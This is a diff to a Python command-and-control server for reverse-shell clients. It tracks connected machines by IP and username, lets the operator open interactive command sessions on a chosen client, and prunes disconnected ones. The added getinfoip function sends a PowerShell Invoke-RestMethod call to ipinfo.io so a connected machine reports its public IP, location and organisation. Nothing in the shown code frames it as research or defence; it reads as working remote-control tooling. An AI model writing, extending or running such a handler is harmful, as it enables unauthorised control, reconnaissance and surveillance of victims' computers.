@@ -23,14 +23,29 @@ def whoami(conn):
     conn.send(bytes("whoami", "utf-8"))
     return conn.recv(64).decode("utf-8")[0:-2]
 
-def lisss():
-    global s
+def getinfoip(conn):
+    conn.send(bytes("$ip = Invoke-RestMethod http://ipinfo.io/json; $ip.ip; $ip.hostname; $ip.city; $ip.region; $ip.country; $ip.loc; $ip.org; $ip.postal", "utf-8"))
+    
+    r = conn.recv(200).decode("utf-8").replace("\r", "").split("\n")
+    print(r)
 
+def lisss():
     print("<Server> waiting for connections...")
 
     while is_conn:
         conn, addr = s.accept()
+        # getinfoip(conn)
         data_client.append([conn, addr, whoami(conn)])
+
+def test_connections():
+    global data_client
+
+    for i in data_client:
+        try:
+            whoami(i[0])
+        except:
+            print(f"[IP: {i[1][0]}, NAME: {i[2]}] the client has disconnected")
+            data_client.remove(i)
 
 def start_server():
     global is_conn
@@ -41,8 +56,11 @@ def start_server():
         if con[0] == "exit":
             is_conn = False
         elif con[0] == "help":
-            print("commands: sessions, session <client number>")
+            print("commands: sessions, session <client number>, test, exit")
         elif con[0] == "sessions":
+            if len(data_client) == 0:
+                print("NO CLIENTS")
+                continue
             print("")
             for i in range(len(data_client)):
                 print(f"client: {i}, name: {data_client[i][2]}, ip: {data_client[i][1][0]}, port: {data_client[i][1][1]}")
@@ -54,7 +72,7 @@ def start_server():
 
             while True:
                 try:
-                    command = input(f"@{data_client[int(con[1])][2]}&>")
+                    command = input(f"@Server/{data_client[int(con[1])][2]}>")
 
                     if command == "exit":
                         break
@@ -70,6 +88,9 @@ def start_server():
 
                 except Exception as e:
                     print(f"server Error: {e}")
+        
+        elif con[0] == "test":
+            test_connections()
 
 while True:
     n = input(colorama.Fore.RED + f"@TCP_Server=>").lower().replace("  ", " ").split(" ")# .remove(" ")
